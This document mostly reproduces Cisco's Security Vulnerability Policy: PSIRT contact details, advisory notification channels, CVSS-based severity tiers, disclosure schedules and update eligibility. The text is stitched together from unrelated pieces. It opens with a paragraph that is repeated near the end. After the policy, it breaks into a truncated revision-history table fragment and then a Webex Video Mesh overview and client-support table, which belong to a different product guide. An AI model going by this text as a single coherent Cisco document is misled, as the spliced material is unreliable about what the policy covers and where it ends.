**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |
| **Hours** | 24 hours a day, 7 days a week |

## Receiving Security Vulnerability Information from Cisco

There are several ways to stay connected and receive the latest security vulnerability information from Cisco. Customers should review the following table, and subsequent summaries, to determine the appropriate option for them:

| **Cisco.com** | <https://www.cisco.com/security/> |

| **My Notifications** | <https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

The [My Notifications website](https://www.cisco.com/c/en/us/support/web/tools/cns/notifications.html) allows registered Cisco.com users to subscribe to and receive important Cisco product and technology information, including Cisco Security Advisories. This service provides an improved unified subscription experience, allowing users to choose the timing of notifications as well as the notification delivery method (email or RSS feed). The level of access will be determined by the subscriber's relationship with Cisco.

### Creating a Notification

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

See *Enable 1080p HD Video for On-Premises SIP Devices in Video Mesh Node Meetings* for more information. * Updated the supported device and endpoints table to list only the tested cloud-registered devices. |
| September 26, 2019 | * Added new section *Configure Network Settings from Video Mesh Node Web Interface*. * Fixed the description if the Resource Utilization report. It now states: Average resource utilization for the media microservices used in the Video Mesh clusters. * Added a note to the capacity section: Overflows on low call volume (especially SIP calls that originate on-premises) are not a true reflection of scale. Video Mesh analytics (under Control Hub > Resources > Call Activity) indicate the call legs that originate on-premises; they do no specify the call streams that came in through the cascade to the Video Mesh node for media processing. As remote participant numbers increase in a meeting, the resulting cascade increases and consumes on-premises media resources on the Video Mesh node. |
| September 13, 2019 | * Updated *Install and Configure Video Mesh Node Software* with network configuration steps that appear on the Customize template page. * Updated *System and Platform Requirements for Video Mesh Node Software* with 72vCPUs (the equivalent of CMS 1000) for specifications-based configuration. |

### Webex Video Mesh Overview

Webex
Video Mesh dynamically finds the optimal mix of on-premises and cloud conferencing resources. On-premises conferences stay on premises when there are enough local resources. When local resources are exhausted, conferences then expand to the cloud.

Video Mesh Node is software that is installed on an on-premises Cisco UCS server, registered to the cloud, and managed in Control Hub. Webex meetings, Webex Personal Meeting Room, Webex Space Meetings, and Webex App calls between two people can be routed to the local, on-net Video Mesh nodes. Video Mesh selects the most efficient way to use the available resources.

Video Mesh provides these benefits:

* Improves quality and reduces latency by allowing you to keep your calls on
  premises.
* Extends your calls transparently to the cloud when on-premises resources have
  reached their limit or are unavailable.
* Manage your Video Mesh clusters from the cloud with a single administrative interface: Control Hub ( <https://admin.webex.com>).
* Optimize resources and scale capacity, as needed.
* Combines the features of cloud and on-premises conferencing in one seamless
  user experience.
* Reduces capacity concerns, because the cloud is always available when
  additional conferencing resources are needed. No need to do capacity
  planning for the worst case scenario.
* Provides advanced analytics on capacity and usage and troubleshooting report
  data in <https://admin.webex.com>.
* Uses local media processing when users dial in to a Webex meeting from on-premises standards-based SIP endpoints and clients:

  + SIP based endpoints and clients (Cisco endpoints, Jabber, 3rd party SIP), registered to on-premises call control (Cisco Unified Communications Manager or Expressway), that call into a Cisco Webex meeting.
  + Webex App (including paired with room devices) that join a Webex meeting.
  + Webex room and desk devices that directly join a Webex meeting.
* Provides optimized audio and video interactive voice response (IVR) to on-net
  SIP based endpoints and clients.
* H.323, IP dial-in, and Skype for Business (S4B) endpoints continue to join
  meetings from the cloud.
* Supports 1080p 30fps high definition video as an option for meetings, if
  meeting participants that can support 1080p are hosted through the local
  on-premises Video Mesh nodes. (If a participant joins an in-progress meeting from the cloud,
  on-premises users continue to experience 1080p 30fps on supported
  endpoints.)
* Enhanced and differentiated Quality of Service (QoS) marking: separate audio
  (EF) and video (AF41).

  Webex Video Mesh currently does not support Webex Webinars.
* Supports End to End Encrypted Meetings (E2EE meetings). If a customer deploys Video Mesh and selects the E2EE meeting type, it adds an additional layer of security, ensuring your data (media, files, whiteboards, annotations) remains secure and blocks third parties from accessing or modifying it. For detailed information, see [Deploy Zero-Trust Meetings](https://help.webex.com/en-us/article/nedfu0h/Deploy-Zero-Trust-Meetings#Cisco_Reference.dita_f8e15b7e-3b65-4d88-b839-6e9fb80ca8ad).

  Private meetings currently do not support End to End Encryption.

### Clients and Devices That Use Video Mesh Node

We endeavor to make Video Mesh interoperable with relevant clients and device types. Although it is not possible
to test all scenarios, the testing on which this data is based covers most common
functions of the listed endpoints and infrastructure. The absence of a device or
client implies a lack of testing and a lack of official support from Cisco.

Table 1. Clients and Devices That Use Video Mesh Node
| Client or Device Type | Uses Video Mesh Node on Point to Point Call | Uses Video Mesh Node on Multiparty Meeting |
| --- | --- | --- |
| Webex App (desktop and mobile) | Yes | Yes |
| Webex devices, including room devices and Webex Board. (See the [Endpoint and Webex App Requirements](#reference_C2E8A3047629EDAF6B268B7473F59F13) section for a full list.) | Yes | Yes |
| In-room wireless share between Webex App and supported Room, Desk, and Board devices. | Yes | Yes |
| Unified CM-registered devices (including IX endpoints) and clients (including Jabber VDI 12.6 and later, and Webex VDI 39.3 and later), calling into a Webex scheduled or Webex Personal Room meeting.\* | No | Yes |
| VCS/Expressway-registered devices, calling into a Webex scheduled or Webex Personal Room meeting.\* | No | Yes |
| Webex *Call My Video System* to Webex cloud-registered video devices | N/A | Yes |
| Webex App web client ( <https://web.webex.com>) | Yes | Yes |
| Phones registered to Cisco Webex Calling | No | No |
| Webex *Call My Video System* to premises-registered SIP devices | N/A | No |

\* It is not possible to guarantee that all on-premises devices and clients have been tested with the Video Mesh solution.

